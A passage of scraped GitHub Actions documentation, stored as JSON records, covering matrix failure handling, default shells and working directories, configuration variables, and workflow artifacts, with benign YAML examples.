        "content": "name: shared matrix\non:\n  push:\n  workflow_dispatch:\n\njobs:\n  define-matrix:\n    runs-on: ubuntu-latest\n\n    outputs:\n      colors: ${{ steps.colors.outputs.colors }}\n\n    steps:\n      - name: Define Colors\n        id: colors\n        run: |\n          echo 'colors=[\"red\", \"green\", \"blue\"]' >> \"$GITHUB_OUTPUT\"\n\n  produce-artifacts:\n    runs-on: ubuntu-latest\n    needs: define-matrix\n    strategy:\n      matrix:\n        color: ${{ fromJSON(needs.define-matrix.outputs.colors) }}\n\n    steps:\n      - name: Define Color\n        env:\n          color: ${{ matrix.color }}\n        run: |\n          echo \"$color\" > color\n      - name: Produce Artifact\n        uses: actions/upload-artifact@v4\n        with:\n          name: ${{ matrix.color }}\n          path: color\n\n  consume-artifacts:\n    runs-on: ubuntu-latest\n    needs:\n    - define-matrix\n    - produce-artifacts\n    strategy:\n      matrix:\n        color: ${{ fromJSON(needs.define-matrix.outputs.colors) }}\n\n    steps:\n    - name: Retrieve Artifact\n      uses: actions/download-artifact@v4\n      with:\n        name: ${{ matrix.color }}\n\n    - name: Report Color\n      run: |\n        cat color"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Handling failures"
      },
      {
        "type": "paragraph",
        "text": "You can control how job failures are handled withjobs.<job_id>.strategy.fail-fastandjobs.<job_id>.continue-on-error."
      },
      {
        "type": "paragraph",
        "text": "jobs.<job_id>.strategy.fail-fastapplies to the entire matrix. Ifjobs.<job_id>.strategy.fail-fastis set totrueor its expression evaluates totrue, GitHub will cancel all in-progress and queued jobs in the matrix if any job in the matrix fails. This property defaults totrue."
      },
      {
        "type": "paragraph",
        "text": "jobs.<job_id>.continue-on-errorapplies to a single job. Ifjobs.<job_id>.continue-on-erroristrue, other jobs in the matrix will continue running even if the job withjobs.<job_id>.continue-on-error: truefails."
      },
      {
        "type": "paragraph",
        "text": "You can usejobs.<job_id>.strategy.fail-fastandjobs.<job_id>.continue-on-errortogether. For example, the following workflow will start four jobs. For each job,continue-on-erroris determined by the value ofmatrix.experimental. If any of the jobs withcontinue-on-error: falsefail, all jobs that are in progress or queued will be cancelled. If the job withcontinue-on-error: truefails, the other jobs will not be affected."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  test:\n    runs-on: ubuntu-latest\n    continue-on-error: ${{ matrix.experimental }}\n    strategy:\n      fail-fast: true\n      matrix:\n        version: [6, 7, 8]\n        experimental: [false]\n        include:\n          - version: 9\n            experimental: true"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Defining the maximum number of concurrent jobs"
      },
      {
        "type": "paragraph",
        "text": "By default, GitHub will maximize the number of jobs run in parallel depending on runner availability. To set the maximum number of jobs that can run simultaneously when using amatrixjob strategy, usejobs.<job_id>.strategy.max-parallel."
      },
      {
        "type": "paragraph",
        "text": "For example, the following workflow will run a maximum of two jobs at a time, even if there are runners available to run all six jobs at once."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  example_matrix:\n    strategy:\n      max-parallel: 2\n      matrix:\n        version: [10, 12, 14]\n        os: [ubuntu-latest, windows-latest]"
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/setting-a-default-shell-and-working-directory",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Overview"
      },
      {
        "type": "paragraph",
        "text": "Usedefaultsto create amapof default settings that will apply to all jobs in the workflow. You can also set default settings that are only available to a job. For more information, seejobs.<job_id>.defaults."
      },
      {
        "type": "paragraph",
        "text": "When more than one default setting is defined with the same name, GitHub uses the most specific default setting. For example, a default setting defined in a job will override a default setting that has the same name defined in a workflow."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Setting default shell and working directory"
      },
      {
        "type": "paragraph",
        "text": "You can usedefaults.runto provide defaultshellandworking-directoryoptions for allrunsteps in a workflow. You can also set default settings forrunthat are only available to a job. For more information, seejobs.<job_id>.defaults.run. You cannot use contexts or expressions in this keyword."
      },
      {
        "type": "paragraph",
        "text": "When more than one default setting is defined with the same name, GitHub uses the most specific default setting. For example, a default setting defined in a job will override a default setting that has the same name defined in a workflow."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Set the default shell and working directory"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "defaults:\n  run:\n    shell: bash\n    working-directory: ./scripts"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Setting default values for a specific job"
      },
      {
        "type": "paragraph",
        "text": "Usejobs.<job_id>.defaultsto create amapof default settings that will apply to all steps in the job. You can also set default settings for the entire workflow. For more information, seedefaults."
      },
      {
        "type": "paragraph",
        "text": "When more than one default setting is defined with the same name, GitHub uses the most specific default setting. For example, a default setting defined in a job will override a default setting that has the same name defined in a workflow."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Setting default shell and working directory for a job"
      },
      {
        "type": "paragraph",
        "text": "Usejobs.<job_id>.defaults.runto provide defaultshellandworking-directoryto allrunsteps in the job."
      },
      {
        "type": "paragraph",
        "text": "You can provide defaultshellandworking-directoryoptions for allrunsteps in a job. You can also set default settings forrunfor the entire workflow. For more information, seedefaults.run."
      },
      {
        "type": "paragraph",
        "text": "These can be overridden at thejobs.<job_id>.defaults.runandjobs.<job_id>.steps[*].runlevels."
      },
      {
        "type": "paragraph",
        "text": "When more than one default setting is defined with the same name, GitHub uses the most specific default setting. For example, a default setting defined in a job will override a default setting that has the same name defined in a workflow."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Setting defaultrunstep options for a job"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  job1:\n    runs-on: ubuntu-latest\n    defaults:\n      run:\n        shell: bash\n        working-directory: ./scripts"
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/store-information-in-variables",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About variables"
      },
      {
        "type": "paragraph",
        "text": "Variables provide a way to store and reuse non-sensitive configuration information. You can store any configuration data such as compiler flags, usernames, or server names as variables. Variables are interpolated on the runner machine that runs your workflow. Commands that run in actions or workflow steps can create, read, and modify variables."
      },
      {
        "type": "paragraph",
        "text": "You can set your own custom variables or use the default environment variables that GitHub sets automatically. For more information, seeDefault environment variables."
      },
      {
        "type": "paragraph",
        "text": "You can set a custom variable in two ways."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "To define an environment variable for use in a single workflow, you can use theenvkey in the workflow file. For more information, seeDefining environment variables for a single workflow.",
          "To define a configuration variable across multiple workflows, you can define it at the organization, repository, or environment level. For more information, seeDefining configuration variables for multiple workflows."
        ]
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "By default, variables render unmasked in your build outputs. If you need greater security for sensitive information, such as passwords, use secrets instead. For more information, seeAbout secrets."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Defining environment variables for a single workflow"
      },
      {
        "type": "paragraph",
        "text": "To set a custom environment variable for a single workflow, you can define it using theenvkey in the workflow file. The scope of a custom variable set by this method is limited to the element in which it is defined. You can define variables that are scoped for:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "The entire workflow, by usingenvat the top level of the workflow file.",
          "The contents of a job within a workflow, by usingjobs.<job_id>.env.",
          "A specific step within a job, by usingjobs.<job_id>.steps[*].env."
        ]
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Greeting on variable day\n\non:\n  workflow_dispatch\n\nenv:\n  DAY_OF_WEEK: Monday\n\njobs:\n  greeting_job:\n    runs-on: ubuntu-latest\n    env:\n      Greeting: Hello\n    steps:\n      - name: \"Say Hello Mona it's Monday\"\n        run: echo \"$Greeting $First_Name. Today is $DAY_OF_WEEK!\"\n        env:\n          First_Name: Mona"
      },
      {
        "type": "paragraph",
        "text": "You can accessenvvariable values using runner environment variables or using contexts. The example above shows three custom variables being used as runner environment variables in anechocommand:$DAY_OF_WEEK,$Greeting, and$First_Name. The values for these variables are set, and scoped, at the workflow, job, and step level respectively. The interpolation of these variables happens on the runner."
      },
      {
        "type": "paragraph",
        "text": "The commands in therunsteps of a workflow, or a referenced action, are processed by the shell you are using on the runner. The instructions in the other parts of a workflow are processed by GitHub Actions and are not sent to the runner. You can use either runner environment variables or contexts inrunsteps, but in the parts of a workflow that are not sent to the runner you must use contexts to access variable values. For more information, seeUsing contexts to access variable values."
      },
      {
        "type": "paragraph",
        "text": "Because runner environment variable interpolation is done after a workflow job is sent to a runner machine, you must use the appropriate syntax for the shell that's used on the runner. In this example, the workflow specifiesubuntu-latest. By default, Linux runners use the bash shell, so you must use the syntax$NAME. By default, Windows runners use PowerShell, so you would use the syntax$env:NAME. For more information about shells, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Naming conventions for environment variables"
      },
      {
        "type": "paragraph",
        "text": "When you set an environment variable, you cannot use any of the default environment variable names. For a complete list of default environment variables, seeDefault environment variablesbelow. If you attempt to override the value of one of these default variables, the assignment is ignored."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "You can list the entire set of environment variables that are available to a workflow step by usingrun: envin a step and then examining the output for the step."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Defining configuration variables for multiple workflows"
      },
      {
        "type": "paragraph",
        "text": "You can create configuration variables for use across multiple workflows, and can define them at either theorganization,repository, orenvironmentlevel."
      },
      {
        "type": "paragraph",
        "text": "For example, you can use configuration variables to set default values for parameters passed to build tools at an organization level, but then allow repository owners to override these parameters on a case-by-case basis."
      },
      {
        "type": "paragraph",
        "text": "When you define configuration variables, they are automatically available in thevarscontext. For more information, seeUsing thevarscontext to access configuration variable values."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Configuration variable precedence"
      },
      {
        "type": "paragraph",
        "text": "If a variable with the same name exists at multiple levels, the variable at the lowest level takes precedence. For example, if an organization-level variable has the same name as a repository-level variable, then the repository-level variable takes precedence. Similarly, if an organization, repository, and environment all have a variable with the same name, the environment-level variable takes precedence."
      },
      {
        "type": "paragraph",
        "text": "For reusable workflows, the variables from the caller workflow's repository are used. Variables from the repository that contains the called workflow are not made available to the caller workflow."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Naming conventions for configuration variables"
      },
      {
        "type": "paragraph",
        "text": "The following rules apply to configuration variable names:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Can only contain alphanumeric characters ([a-z],[A-Z],[0-9]) or underscores (_). Spaces are not allowed.",
          "Must not start with theGITHUB_prefix.",
          "Must not start with a number.",
          "Are case insensitive.",
          "Must be unique to the repository, organization, or enterprise where they are created."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Creating configuration variables for a repository"
      },
      {
        "type": "paragraph",
        "text": "To create secrets or variables on GitHub for a personal account repository, you must be the repository owner. To create secrets or variables on GitHub for an organization repository, you must haveadminaccess. Lastly, to create secrets or variables for a personal account repository or an organization repository through the REST API, you must have collaborator access."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickSettings. If you cannot see the \"Settings\" tab, select thedropdown menu, then clickSettings.",
          "In the \"Security\" section of the sidebar, selectSecrets and variables, then clickActions.",
          "Click theVariablestab.",
          "ClickNew repository variable.",
          "In theNamefield, enter a name for your variable.",
          "In theValuefield, enter the value for your variable.",
          "ClickAdd variable."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Creating configuration variables for an environment"
      },
      {
        "type": "paragraph",
        "text": "To create secrets or variables for an environment in a personal account repository, you must be the repository owner. To create secrets or variables for an environment in an organization repository, you must haveadminaccess. For more information on environments, seeManaging environments for deployment."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickSettings. If you cannot see the \"Settings\" tab, select thedropdown menu, then clickSettings.",
          "In the left sidebar, clickEnvironments.",
          "Click on the environment that you want to add a variable to.",
          "UnderEnvironment variables, clickAdd variable.",
          "In theNamefield, enter a name for your variable.",
          "In theValuefield, enter the value for your variable.",
          "ClickAdd variable."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Creating configuration variables for an organization"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Organization-level secrets and variables are not accessible by private repositories for GitHub Free. For more information about upgrading your GitHub subscription, seeUpgrading your account's plan."
      },
      {
        "type": "paragraph",
        "text": "When creating a secret or variable in an organization, you can use a policy to limit access by repository. For example, you can grant access to all repositories, or limit access to only private repositories or a specified list of repositories."
      },
      {
        "type": "paragraph",
        "text": "Organization owners can create secrets or variables at the organization level."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the organization.",
          "Under your organization name, clickSettings. If you cannot see the \"Settings\" tab, select thedropdown menu, then clickSettings.",
          "In the \"Security\" section of the sidebar, selectSecrets and variables, then clickActions.",
          "Click theVariablestab.",
          "ClickNew organization variable.",
          "In theNamefield, enter a name for your variable.",
          "In theValuefield, enter the value for your variable.",
          "From theRepository accessdropdown list, choose an access policy.",
          "ClickAdd variable."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Limits for configuration variables"
      },
      {
        "type": "paragraph",
        "text": "Individual variables are limited to 48 KB in size."
      },
      {
        "type": "paragraph",
        "text": "You can store up to 1,000 organization variables, 500 variables per repository, and 100 variables per environment. The total combined size limit for organization and repository variables is 256 KB per workflow run."
      },
      {
        "type": "paragraph",
        "text": "A workflow created in a repository can access the following number of variables:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Up to 500 repository variables, if the total size of repository variables is less than 256 KB. If the total size of repository variables exceeds 256 KB, only the repository variables that fall below the limit will be available (as sorted alphabetically by variable name).",
          "Up to 1,000 organization variables, if the total combined size of repository and organization variables is less than 256 KB. If the total combined size of organization and repository variables exceeds 256 KB, only the organization variables that fall below that limit will be available (after accounting for repository variables and as sorted alphabetically by variable name).",
          "Up to 100 environment-level variables."
        ]
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Environment-level variables do not count toward the 256 KB total size limit. If you exceed the combined size limit for repository and organization variables and still need additional variables, you can use an environment and define additional variables in the environment."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using contexts to access variable values"
      },
      {
        "type": "paragraph",
        "text": "Contexts are a way to access information about workflow runs, variables, runner environments, jobs, and steps. For more information, seeAccessing contextual information about workflow runs. There are many other contexts that you can use for a variety of purposes in your workflows. For details of where you can use specific contexts within a workflow, seeAccessing contextual information about workflow runs."
      },
      {
        "type": "paragraph",
        "text": "You can access environment variable values using theenvcontext and configuration variable values using thevarscontext."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using theenvcontext to access environment variable values"
      },
      {
        "type": "paragraph",
        "text": "In addition to runner environment variables, GitHub Actions allows you to set and readenvkey values using contexts. Environment variables and contexts are intended for use at different points in the workflow."
      },
      {
        "type": "paragraph",
        "text": "Therunsteps in a workflow, or in a referenced action, are processed by a runner. As a result, you can use runner environment variables here, using the appropriate syntax for the shell you are using on the runner - for example,$NAMEfor the bash shell on a Linux runner, or$env:NAMEfor PowerShell on a Windows runner. In most cases you can also use contexts, with the syntax${{ CONTEXT.PROPERTY }}, to access the same value. The difference is that the context will be interpolated and replaced by a string before the job is sent to a runner."
      },
      {
        "type": "paragraph",
        "text": "However, you cannot use runner environment variables in parts of a workflow that are processed by GitHub Actions and are not sent to the runner. Instead, you must use contexts. For example, anifconditional, which determines whether a job or step is sent to the runner, is always processed by GitHub Actions. You must therefore use a context in anifconditional statement to access the value of an variable."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Conditional env variable\n\non: workflow_dispatch\n\nenv:\n  DAY_OF_WEEK: Monday\n\njobs:\n  greeting_job:\n    runs-on: ubuntu-latest\n    env:\n      Greeting: Hello\n    steps:\n      - name: \"Say Hello Mona it's Monday\"\n        if: ${{ env.DAY_OF_WEEK == 'Monday' }}\n        run: echo \"$Greeting $First_Name. Today is $DAY_OF_WEEK!\"\n        env:\n          First_Name: Mona"
      },
      {
        "type": "paragraph",
        "text": "In this modification of the earlier example, we've introduced anifconditional. The workflow step is now only run ifDAY_OF_WEEKis set to \"Monday\". We access this value from theifconditional statement by using theenvcontext. Theenvcontext is not required for the variables referenced within theruncommand. They are referenced as runner environment variables and are interpolated after the job is received by the runner. We could, however, have chosen to interpolate those variables before sending the job to the runner, by using contexts. The resulting output would be the same."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "run: echo \"${{ env.Greeting }} ${{ env.First_Name }}. Today is ${{ env.DAY_OF_WEEK }}!\""
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Contexts are usually denoted using the dollar sign and curly braces, as${{ context.property }}. In anifconditional, the${{and}}are optional, but if you use them they must enclose the entire comparison statement, as shown above."
      },
      {
        "type": "paragraph",
        "text": "You will commonly use either theenvorgithubcontext to access variable values in parts of the workflow that are processed before jobs are sent to runners."
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "When creating workflows and actions, you should always consider whether your code might execute untrusted input from possible attackers. Certain contexts should be treated as untrusted input, as an attacker could insert their own malicious content. For more information, seeSecurity hardening for GitHub Actions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using thevarscontext to access configuration variable values"
      },
      {
        "type": "paragraph",
        "text": "Configuration variables can be accessed across the workflow usingvarscontext. For more information, seeAccessing contextual information about workflow runs."
      },
      {
        "type": "paragraph",
        "text": "If a configuration variable has not been set, the return value of a context referencing the variable will be an empty string."
      },
      {
        "type": "paragraph",
        "text": "The following example shows using configuration variables with thevarscontext across a workflow. Each of the following configuration variables have been defined at the repository, organization, or environment levels."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  workflow_dispatch:\nenv:\n  # Setting an environment variable with the value of a configuration variable\n  env_var: ${{ vars.ENV_CONTEXT_VAR }}\n\njobs:\n  display-variables:\n    name: ${{ vars.JOB_NAME }}\n    # You can use configuration variables with the `vars` context for dynamic jobs\n    if: ${{ vars.USE_VARIABLES == 'true' }}\n    runs-on: ${{ vars.RUNNER }}\n    environment: ${{ vars.ENVIRONMENT_STAGE }}\n    steps:\n    - name: Use variables\n      run: |\n        echo \"repository variable : $REPOSITORY_VAR\"\n        echo \"organization variable : $ORGANIZATION_VAR\"\n        echo \"overridden variable : $OVERRIDE_VAR\"\n        echo \"variable from shell environment : $env_var\"\n      env:\n        REPOSITORY_VAR: ${{ vars.REPOSITORY_VAR }}\n        ORGANIZATION_VAR: ${{ vars.ORGANIZATION_VAR }}\n        OVERRIDE_VAR: ${{ vars.OVERRIDE_VAR }}\n        \n    - name: ${{ vars.HELLO_WORLD_STEP }}\n      if: ${{ vars.HELLO_WORLD_ENABLED == 'true' }}\n      uses: actions/hello-world-javascript-action@main\n      with:\n        who-to-greet: ${{ vars.GREET_NAME }}"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Default environment variables"
      },
      {
        "type": "paragraph",
        "text": "The default environment variables that GitHub sets are available to every step in a workflow."
      },
      {
        "type": "paragraph",
        "text": "Because default environment variables are set by GitHub and not defined in a workflow, they are not accessible through theenvcontext. However, most of the default variables have a corresponding, and similarly named, context property. For example, the value of theGITHUB_REFvariable can be read during workflow processing using the${{ github.ref }}context property."
      },
      {
        "type": "paragraph",
        "text": "You can't overwrite the value of the default environment variables namedGITHUB_*andRUNNER_*. Currently you can overwrite the value of theCIvariable. However, it's not guaranteed that this will always be possible. For more information about setting environment variables, seeDefining environment variables for a single workflowandWorkflow commands for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "We strongly recommend that actions use variables to access the filesystem rather than using hardcoded file paths. GitHub sets variables for actions to use in all runner environments."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "If you need to use a workflow run's URL from within a job, you can combine these variables:$GITHUB_SERVER_URL/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Detecting the operating system"
      },
      {
        "type": "paragraph",
        "text": "You can write a single workflow file that can be used for different operating systems by using theRUNNER_OSdefault environment variable and the corresponding context property${{ runner.os }}. For example, the following workflow could be run successfully if you changed the operating system frommacos-latesttowindows-latestwithout having to alter the syntax of the environment variables, which differs depending on the shell being used by the runner."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on: workflow_dispatch\n\njobs:\n  if-Windows-else:\n    runs-on: macos-latest\n    steps:\n      - name: condition 1\n        if: runner.os == 'Windows'\n        run: echo \"The operating system on the runner is $env:RUNNER_OS.\"\n      - name: condition 2\n        if: runner.os != 'Windows'\n        run: echo \"The operating system on the runner is not Windows, it's $RUNNER_OS.\""
      },
      {
        "type": "paragraph",
        "text": "In this example, the twoifstatements check theosproperty of therunnercontext to determine the operating system of the runner.ifconditionals are processed by GitHub Actions, and only steps where the check resolves astrueare sent to the runner. Here one of the checks will always betrueand the otherfalse, so only one of these steps is sent to the runner. Once the job is sent to the runner, the step is executed and the environment variable in theechocommand is interpolated using the appropriate syntax ($env:NAMEfor PowerShell on Windows, and$NAMEfor bash and sh on Linux and macOS). In this example, the statementruns-on: macos-latestmeans that the second step will be run."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Passing values between steps and jobs in a workflow"
      },
      {
        "type": "paragraph",
        "text": "If you generate a value in one step of a job, you can use the value in subsequent steps of the same job by assigning the value to an existing or new environment variable and then writing this to theGITHUB_ENVenvironment file. The environment file can be used directly by an action, or from a shell command in the workflow file by using therunkeyword. For more information, seeWorkflow commands for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "If you want to pass a value from a step in one job in a workflow to a step in another job in the workflow, you can define the value as a job output. You can then reference this job output from a step in another job. For more information, seeWorkflow syntax for GitHub Actions."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/storing-and-sharing-data-from-a-workflow",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About workflow artifacts"
      },
      {
        "type": "paragraph",
        "text": "Artifacts allow you to persist data after a job has completed, and share that data with another job in the same workflow. An artifact is a file or collection of files produced during a workflow run. For example, you can use artifacts to save your build and test output after a workflow run has ended. All actions and workflows called within a run have write access to that run's artifacts."
      },
      {
        "type": "paragraph",
        "text": "By default, GitHub stores build logs and artifacts for 90 days, and this retention period can be customized. For more information, seeUsage limits, billing, and administration. The retention period for a pull request restarts each time someone pushes a new commit to the pull request."
      },
      {
        "type": "paragraph",
        "text": "These are some of the common artifacts that you can upload:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Log files and core dumps",
          "Test results, failures, and screenshots",
          "Binary or compressed files",
          "Stress test performance output and code coverage results"
        ]
      },
      {
        "type": "paragraph",
        "text": "Storing artifacts uses storage space on GitHub. GitHub Actions usage is free for standard GitHub-hosted runners in public repositories, and for self-hosted runners. SeeChoosing the runner for a job. For private repositories, each GitHub account receives a certain amount of free minutes and storage for use with GitHub-hosted runners, depending on the account's plan. Any usage beyond the included amounts is controlled by spending limits. For more information, seeManaging billing for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "Artifacts are uploaded during a workflow run, and you can view an artifact's name and size in the UI. When an artifact is downloaded using the GitHub UI, all files that were individually uploaded as part of the artifact get zipped together into a single file. This means that billing is calculated based on the size of the uploaded artifact and not the size of the zip file."
      },
      {
        "type": "paragraph",
        "text": "GitHub provides two actions that you can use to upload and download build artifacts. For more information, see theupload-artifactanddownload-artifactactions."
      },
      {
        "type": "paragraph",
        "text": "To share data between jobs:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Uploading files:Give the uploaded file a name and upload the data before the job ends.",
          "Downloading files:You can only download artifacts that were uploaded during the same workflow run. When you download a file, you can reference it by name."
        ]
      },
      {
        "type": "paragraph",
        "text": "The steps of a job share the same environment on the runner machine, but run in their own individual processes. To pass data between steps in a job, you can use inputs and outputs. For more information about inputs and outputs, seeMetadata syntax for GitHub Actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Comparing artifacts and dependency caching"
      },
      {
        "type": "paragraph",
        "text": "Artifacts and caching are similar because they provide the ability to store files on GitHub, but each feature offers different use cases and cannot be used interchangeably."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Use caching when you want to reuse files that don't change often between jobs or workflow runs, such as build dependencies from a package management system.",
          "Use artifacts when you want to save files produced by a job to view after a workflow run has ended, such as built binaries or build logs."
        ]
      },
      {
        "type": "paragraph",
        "text": "For more information on dependency caching, seeCaching dependencies to speed up workflows."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Uploading build and test artifacts"
      },
      {
        "type": "paragraph",
        "text": "You can create a continuous integration (CI) workflow to build and test your code. For more information about using GitHub Actions to perform CI, seeAbout continuous integration with GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "The output of building and testing your code often produces files you can use to debug test failures and production code that you can deploy. You can configure a workflow to build and test the code pushed to your repository and report a success or failure status. You can upload the build and test output to use for deployments, debugging failed tests or crashes, and viewing test suite coverage."
      },
      {
        "type": "paragraph",
        "text": "You can use theupload-artifactaction to upload artifacts. When uploading an artifact, you can specify a single file or directory, or multiple files or directories. You can also exclude certain files or directories, and use wildcard patterns. We recommend that you provide a name for an artifact, but if no name is provided thenartifactwill be used as the default name. For more information on syntax, see theactions/upload-artifactaction."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example"
      },
      {
        "type": "paragraph",
        "text": "For example, your repository or a web application might contain SASS and TypeScript files that you must convert to CSS and JavaScript. Assuming your build configuration outputs the compiled files in thedistdirectory, you would deploy the files in thedistdirectory to your web application server if all tests completed successfully."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "|-- hello-world (repository)\n|   └── dist\n|   └── tests\n|   └── src\n|       └── sass/app.scss\n|       └── app.ts\n|   └── output\n|       └── test\n|"
      },
      {
        "type": "paragraph",
        "text": "This example shows you how to create a workflow for a Node.js project that builds the code in thesrcdirectory and runs the tests in thetestsdirectory. You can assume that runningnpm testproduces a code coverage report namedcode-coverage.htmlstored in theoutput/test/directory."
      },
      {
        "type": "paragraph",
        "text": "The workflow uploads the production artifacts in thedistdirectory, but excludes any markdown files. It also uploads thecode-coverage.htmlreport as another artifact."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Node CI\n\non: [push]\n\njobs:\n  build_and_test:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Checkout repository\n        uses: actions/checkout@v4\n      - name: npm install, build, and test\n        run: |\n          npm install\n          npm run build --if-present\n          npm test\n      - name: Archive production artifacts\n        uses: actions/upload-artifact@v4\n        with:\n          name: dist-without-markdown\n          path: |\n            dist\n            !dist/**/*.md\n      - name: Archive code coverage results\n        uses: actions/upload-artifact@v4\n        with:\n          name: code-coverage-report\n          path: output/test/code-coverage.html"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Generating artifact attestations for builds"
      },
      {
        "type": "paragraph",
        "text": "Artifact attestations enable you to create unfalsifiable provenance and integrity guarantees for the software you build. In turn, people who consume your software can verify where and how your software was built."
      },
      {
        "type": "paragraph",
        "text": "When you generate artifact attestations with your software, you create cryptographically signed claims that establish your build's provenance and include the following information:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "A link to the workflow associated with the artifact.",
          "The repository, organization, environment, commit SHA, and triggering event for the artifact.",
          "Other information from the OIDC token used to establish provenance. For more information, seeAbout security hardening with OpenID Connect."
        ]
      },
      {
        "type": "paragraph",
        "text": "You can also generate artifact attestations that include an associated software bill of materials (SBOM). Associating your builds with a list of the open source dependencies used in them provides transparency and enables consumers to comply with data protection standards."
      },
      {
        "type": "paragraph",
        "text": "You can access attestations after a build run, underneath the list of the artifacts the build produced."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeUsing artifact attestations to establish provenance for builds."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Configuring a custom artifact retention period"
      },
      {
        "type": "paragraph",
        "text": "You can define a custom retention period for individual artifacts created by a workflow. When using a workflow to create a new artifact, you can useretention-dayswith theupload-artifactaction. This example demonstrates how to set a custom retention period of 5 days for the artifact namedmy-artifact:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- name: 'Upload Artifact'\n    uses: actions/upload-artifact@v4\n    with:\n      name: my-artifact\n      path: my_file.txt\n      retention-days: 5"
      },
      {
        "type": "paragraph",
        "text": "Theretention-daysvalue cannot exceed the retention limit set by the repository, organization, or enterprise."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Downloading or deleting artifacts"
      },
      {
        "type": "paragraph",
        "text": "During a workflow run, you can use thedownload-artifactaction to download artifacts that were previously uploaded in the same workflow run."
      },
      {
        "type": "paragraph",
        "text": "After a workflow run has been completed, you can download or delete artifacts on GitHub or using the REST API. For more information, seeDownloading workflow artifacts,Removing workflow artifacts, andREST API endpoints for GitHub Actions artifacts."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Downloading artifacts during a workflow run"
      },
      {
        "type": "paragraph",
        "text": "Theactions/download-artifactaction can be used to download previously uploaded artifacts during a workflow run."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "If you want to download artifacts from a different workflow or workflow run, you need to supply a token and run identifier. SeeDownload Artifacts from other Workflow Runs or Repositoriesin the documentation for thedownload-artifactaction."
      },
      {
        "type": "paragraph",
        "text": "Specify an artifact's name to download an individual artifact. If you uploaded an artifact without specifying a name, the default name isartifact."
      },
      {
        "type": "code",
        "language": "yaml",
